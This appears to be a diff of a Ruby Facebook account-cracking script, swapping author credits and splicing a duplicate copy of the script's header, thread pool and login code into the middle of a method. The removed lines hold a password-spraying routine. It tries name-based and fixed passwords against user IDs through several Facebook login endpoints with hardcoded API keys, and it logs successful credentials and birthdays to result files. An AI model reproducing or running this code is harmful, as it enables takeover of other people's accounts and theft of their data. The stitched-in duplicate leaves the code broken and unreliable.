@@ -19,9 +19,9 @@ rescue LoadError
 end
 
 =begin
-Author : ☆ Raka ☆ ™︻®╤───────═◍➤
-Script : BANCI
-Github  : Bangsat-XD
+Author : ☆Raka☆™︻®╤───────═◍➤
+Script : SADIS
+Github : Bangsat-XD
 =end
 
 class ThreadPool
@@ -102,185 +102,113 @@ module Facebook
       elsif success and !graph
         return {'error'=>false,'checkpoint'=>false,'cookie'=>cookie}
       else
-        return {'error'=>(!success and !check),'checkpoint'=>check,'cookie'=>cookie}
-      end
-    end
+#!/usr/bin/ruby
 
-    def self.M(email:, pass:, graph: true)
-      self.hostname(email: email,pass: pass,host: 'm.facebook.com',graph: graph)
-    end
+require 'uri'
+require 'erb'
+require 'date'
+require 'json'
+require 'digest'
+require 'thread'
+require 'open-uri'
+require 'net/http'
+require 'fileutils'
 
-    def self.Mbasic(email:,pass:,graph: true)
-      self.hostname(email: email,pass: pass, host: 'mbasic.facebook.com',graph: graph)
-    end
-    
-    def self.Free(email:, pass:, graph: true)
-      self.hostname(email: email,pass: pass,host: 'free.facebook.com',graph: graph)
-    end
+begin
+  require 'user_agent_parser'
+rescue LoadError
+  require 'rubygems'
+  require 'rubygems/gem_runner'
+  Gem::GemRunner.new.run(['install','user_agent_parser'])
+end
 
-    def self.Touch(email:,pass:,graph: true)
-      self.hostname(email: email,pass: pass,host: 'touch.facebook.com',graph: graph)
-    end
+=begin
+Author : Rahmat adha
+Script : CR4CK
+License: MIT License
+WhatsApp: +6285754629509
+Facebook: www.facebook.com/Anjay.pro098
+Github  : MR-X-Junior
+=end
 
-    def self.Api1(email:,pass:,graph: true)
-      a = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=' + email + 'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=' + pass + 'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
-      b = {'api_key'=> '882a8490361da98702bf97a021ddc14d', 'credentials_type'=> 'password', 'email': email, 'format'=> 'JSON', 'generate_machine_id'=> '1', 'generate_session_cookies'=> '1', 'locale'=> 'en_US', 'method'=> 'auth.login', 'password'=> pass, 'return_ssl_resources'=> '0', 'v'=> '1.0'}
-      c = Digest::MD5.new
-      c.update(a)
-      d = c.hexdigest
-      b.update({'sig': d})
-      uri = URI("https://api.facebook.com/restserver.php")
-      uri.query = URI.encode_www_form(b)
-      request = Net::HTTP::Get.new(uri)
-      request["User-Agent"] = Facebook.user_agent
-      response = Net::HTTP.start(uri.hostname, uri.port, :use_ssl => (uri.scheme == 'https')) {|http| http.request(request)}
-      res = JSON.parse(response.body)
-      error = (!(res.key('access_token')) and (!(res.key? ('error_msg') and (res['error_msg'].include? ('www.facebook.com') or res['error_msg'].include? ('SMS')))))
-      check = ((res.key? ('error_msg')) and (res['error_msg'].include? ('www.facebook.com') or res['error_msg'].include? ('SMS')))
-      if res.key? ('access_token') and graph
-        cookie = res['session_cookies'].map {|i| "#{i['name']}=#{i['value']};"}.join
-        a = Net::HTTP.get(URI("https://graph.facebook.com/me?fields=name,id&access_token=#{res['access_token']}"))
-        b = JSON.parse(a)
-        return {'error'=>false,'checkpoint'=>false,'name'=>b['name'],'id'=>b['id'],'cookie'=>cookie,'session_key'=>res['session_key'],'secret'=>res['secret'],'access_token'=>res['access_token'],'machine_id'=>res['machine_id'],'user_storage_key'=>res['user_storage_key']}
-      elsif res.key? ('access_token') and !graph
-        cookie = res['session_cookies'].map {|i| "#{i['name']}=#{i['value']};"}.join
-        return {'error'=>false,'checkpoint'=>false,'cookie'=>cookie,'access_token'=>res['access_token']}
-      else
-        return {'error'=>error,'checkpoint'=>check}
-      end
-    end
-    
-    def self.Api2(email: ,pass: ,graph: true)
-      pass = ERB::Util.url_encode(pass) if !pass.ascii_only?
-      url = ["https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=#{email}&locale=en_US&password=#{pass}&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6","https://b-api.facebook.com/method/auth.login?access_token=350685531728%257C62f8ce9f74b12f84c123cc23437a4a32&format=JSON&sdk_version=2&email=#{email}&locale=en_US&password=#{pass}&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6"].sample
-      req = URI.open(url,"x-fb-connection-bandwidth" => rand(20000000.0..30000000.0).to_s,"x-fb-sim-hni" => rand(20000..40000).to_s,"x-fb-net-hni" => rand(20000..40000).to_s,"x-fb-connection-quality" => "EXCELLENT", "x-fb-connection-type" => "cell.CTRadioAccessTechnologyHSDPA", "user-agent" => Facebook.user_agent,"content-type" => "application/x-www-form-urlencoded","x-fb-http-engine" => "Liger")
-      res = JSON.parse(req.read)
-      error = (!(res.key('access_token')) and (!(res.key? ('error_msg') and (res['error_msg'].include? ('www.facebook.com') or res['error_msg'].include? ('SMS')))))
-      check = ((res.key? ('error_msg')) and (res['error_msg'].include? ('www.facebook.com') or res['error_msg'].include? ('SMS')))
-      if res.key? ('access_token') and graph
-        cookie = res['session_cookies'].map {|i| "#{i['name']}=#{i['value']};"}.join
-        a = Net::HTTP.get(URI("https://graph.facebook.com/me?fields=name,id&access_token=#{res['access_token']}"))
-        b = JSON.parse(a)
-        return {'error'=>false,'checkpoint'=>false,'name'=>b['name'],'id'=>b['id'],'cookie'=>cookie,'session_key'=>res['session_key'],'secret'=>res['secret'],'access_token'=>res['access_token'],'machine_id'=>res['machine_id'],'user_storage_key'=>res['user_storage_key']}
-      elsif res.key? ('access_token') and !graph
-        cookie = res['session_cookies'].map {|i| "#{i['name']}=#{i['value']};"}.join
-        return {'error'=>false,'checkpoint'=>false,'cookie'=>cookie,'access_token'=>res['access_token']}
-      else
-        return {'error'=>error,'checkpoint'=>check}
-      end
-    end
-    
-  end
-
-  class Crack < Login
-    
-    private_class_method :Cookie, :Api1, :Api2, :M, :Mbasic, :Free, :Touch, :hostname
-
-    attr_reader :listid, :method, :cp_save, :ok_save
-    attr_accessor :auto_pass, :use_ttl, :password
-
-    def initialize(listid:,max_workers: 30)
-      @email = listid
-      @pool = ThreadPool.new(size: max_workers)
-      @token = File.read('login.txt')
-      @cp_save = File.join('results','CP',Time.now.strftime("_%d_%m_%Y.txt"))
-      @ok_save = File.join('results','OK',Time.now.strftime("_%d_%m_%Y.txt"))
-      puts ("\n[ Silahkan Pilih Metode Crack ] ")
-      puts ("\n[1] Metode Login b-api.facebook.com")
-      puts ("[2] Metode Login m.facebook.com")
-      puts ("[3] Metode Login mbasic.facebook.com")
-      puts ("[4] Metode Login free.facebook.com")
-      puts ("[5] Metode Login touch.facebook.com")
-      
-      print ("\n[?] Pilih : ")
-      tod = STDIN.gets.to_i
-      case tod; when 1; @method = 'Api2'; when 2; @method = 'M'; when 3; @method = 'Mbasic'; when 4;@method = 'Free';else;@method = 'Touch';end
-      print ("\n[?] Password Auto/Manual (a/m) : ")
-      auto = STDIN.gets.chomp.downcase
-      if auto == 'm'
-        puts("\n[!] Gunakan ',' Sebagai pemisah, contoh: Anjing,Sayang")
-        loop do
-          print ("[+] Masukan Kata Sandi : ")
-          a = STDIN.gets.chomp.split(',').uniq
-          b = a.map {|i| i = i if i.length >= 6}.compact
-          if a.empty?
-            puts ("\n[!] Password Tidak Boleh Kosong!\n\n")
-          elsif b.empty?
-            puts ("\n[!] Panjang Password Minimal 6 karakter\n\n")
-          else
-            @password = b.clone
-            break
+class ThreadPool
+  def initialize(size:)
+    @size = size
+    @jobs = Queue.new
+    @pool = Array.new(size) do
+      Thread.new do
+        catch(:exit) do
+          loop do
+            job, args = @jobs.pop
+            job.call(*args)
           end
         end
-        @auto_pass = false
-      else
-        @password = ['Anjing','Sayang','Kontol']
-        @auto_pass = true
       end
-      print ("\n[?] Crack Menggunakan Tanggal Lahir (y/n) : ")
-      @use_ttl = (STDIN.gets.chomp.downcase == 'y')
+    end
+  end
+
+  def schedule(*args, &block)
+    @jobs << [block, args]
+  end
+
+  def shutdown
+    @size.times do
+      schedule { throw :exit }
     end
 
-    def start
-      puts ("\n[!] Hasil OK Tersimpan Di : #{@ok_save}")
-      puts ("[!] Hasil CP Tersimpan Di : #{@cp_save}\n\n")
-      ok = 0
-      cp = 0
-      @email.each do |usr|
-        @pool.schedule do
-          pw = @password.clone
-          if @auto_pass
-            next if !usr.key? ('name')
-            name = usr['name'].split
-            (name.length == 1) ? pass = [name.first + '123',name.first + '12345',name.first + '321',name.first + '54321'] : pass = [name.first + '123',name.first + '12345',name.last + '123',name.last + '54321']
-            pass = pass.map {|i| i = i if i.length >= 6}.compact
-            pw += pass
-          end
-          pw.each do |passw|
-            begin
-              login = self.class.superclass.send(@method,email: usr['id'],pass: passw,graph: false)
-              if @use_ttl
-                if (!login['error'] and !login['checkpoint'])
-                  ok += 1
-                  born = JSON.parse(Net::HTTP.get(URI("https://graph.facebook.com/#{usr['id']}?fields=birthday&access_token=#{@token}")))['birthday'].to_s.split('/')
-                  born = born.insert(0,born.delete_at(1))
-                  ttl = (!born.nil?) ? born.map{|i| i.rjust(2, '0')}.join('/') : "??/??/????"
-                  File.open(@ok_save,'a') {|f| f.write("#{usr['id']} | #{passw} | #{ttl}\n")}
-                  puts ("\033[92m[OK] #{usr['id']} | #{passw} | #{ttl}\033[0m")
-                  break
-                elsif login['checkpoint']
-                  cp += 1
-                  born = JSON.parse(Net::HTTP.get(URI("https://graph.facebook.com/#{usr['id']}?fields=birthday&access_token=#{@token}")))['birthday'].to_s.split('/')
-                  born = born.insert(0,born.delete_at(1))
-                  ttl = (!born.nil?) ? born.map{|i| i.rjust(2, '0')}.join('/') : "??/??/????"
-                  File.open(@cp_save,'a') {|f| f.write("#{usr['id']} | #{passw} | #{ttl}\n")}
-                  puts ("\033[93m[CP] #{usr['id']} | #{passw} | #{ttl}\033[0m")
-                  break
-                end
-              else
-                if (!login['error'] and !login['checkpoint'])
-                  ok += 1
-                  File.open(@ok_save,'a') {|f| f.write("#{usr['id']} | #{passw}\n")}
-                  puts ("\033[92m[OK] #{usr['id']} | #{passw}\033[0m")
-                  break
-                elsif login['checkpoint']
-                  cp += 1
-                  File.open(@cp_save,'a') {|f| f.write("#{usr['id']} | #{passw}\n")}
-                  puts ("\033[93m[CP] #{usr['id']} | #{passw}\033[0m")
-                  break
-                end
-              end
-            rescue NoMethodError,Net::ReadTimeout,Errno::ETIMEDOUT then next
-            rescue SocketError
-              puts ("\033[91m[!] No Connection\033[0m")
-              sleep (0.9)
-            rescue Net::OpenTimeout
-              puts ("\033[93m[!] Connection timed out\033[0m")
-              sleep(1)
-            rescue Errno::ENETUNREACH,Errno::ECONNRESET
-              puts ("\033[93m[!] Slow Internet Connection\033[0m")
-              sleep(0.5)
-            end
+    @pool.map(&:join)
+  end
+end
+
+
+module Facebook
+
+  class << self; attr_accessor :user_agent; end
+
+  self.user_agent = "Mozilla/5.0 (Linux; Android 9; SM-N976V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.89 Mobile Safari/537.36"
+
+  class Login
+  
+    def self.Cookie(cookie:, graph: true)
+      uri = URI("https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_")
+      headers = {'Host':'m.facebook.com','origin':'https://m.facebook.com','referer':'https://m.facebook.com/','User-Agent':'Mozilla/5.0 (Linux; Android 9; SM-N976V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.89 Mobile Safari/537.36','upgrade-insecure-requests':'1','accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7','cache-control':'max-age=0','accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8','Cookie':cookie}
+
+      req = Net::HTTP::Get.new(uri,headers)
+
+      res = Net::HTTP.start(uri.host,uri.port, :use_ssl => true) {|http| http.request(req)}
+      khaneysia = res.body.match(/EAAA\w+/)
+      _23_08_2021 = (res['location'].to_s.include? ('checkpoint') or cookie.include? ('checkpoint') or res['set-cookie'].to_s.include? ('checkpoint'))
+      rahmet = (!khaneysia and !_23_08_2021)
+      if khaneysia and graph
+        a = Net::HTTP.get(URI("https://graph.facebook.com/me?fields=name,id&access_token=#{khaneysia.to_s}"))
+        b = JSON.parse(a)
+        return {'error'=>false,'checkpoint'=>false,'name'=>b['name'],'id'=>b['id'],'access_token'=>khaneysia.to_s,'cookie'=>cookie}
+      elsif khaneysia and !graph
+        return {'error'=>false,'checkpoint'=>false,'cookie'=>cookie}
+      else
+        return {'error'=>rahmet,'checkpoint'=>_23_08_2021,'cookie'=>cookie}
+      end
+    end
+    
+    def self.hostname(email:,pass:,host:,graph: true)
+      raise ArgumentError, "Invalid Hostname" if !['m.facebook.com','free.facebook.com','mbasic.facebook.com','touch.facebook.com'].include? (host)
+      headers = {"Host":host,"cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":Facebook.user_agent,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
+      
+      url = URI("https://#{host}/login.php")
+      post = Net::HTTP::Post.new(url,headers)
+      
+      post.set_form_data({'email'=>email,'pass'=>pass,'login'=>'submit'})
+      
+      login = Net::HTTP.start(url.host,url.port,:use_ssl => true) {|http| http.request(post)}
+      cookie = login.to_hash['set-cookie'].collect{|ea|ea[/^.*?;/]}.join
+      success = ((cookie.include? ('c_user')) or (login['location'].to_s.include? ('save-device')))
+      check = (cookie.include? ('checkpoint')) or (login['location'].to_s.include? ('checkpoint'))
+      
+      if success and graph
+        self.Cookie(cookie: cookie)
+      elsif success and !graph
+        return {'error'=>false,'checkpoint'=>false,'cookie'=>cookie}
+      else
           end
         end
       end
@@ -293,9 +221,10 @@ module Facebook
 end
 
 $logo = <<-INI_LOGO
-  Author  : ☆Raka☆™︻®╤───────═◍➤
-  Github  : Bangsat-XD
-  Version : 1.0
+  ________  ___  _______ __
+ / ___/ _ \\/ _ |/ ___/ //_/ Author : ☆Raka☆™︻®╤─────═◍➤
+/ /__/ , _/ __ / /__/ ,<    Github  : Bangsat-XD
+\\___/_/|_/_/ |_\\___/_/|_|   Version : 1.0
 INI_LOGO
 
 def tik(teks)
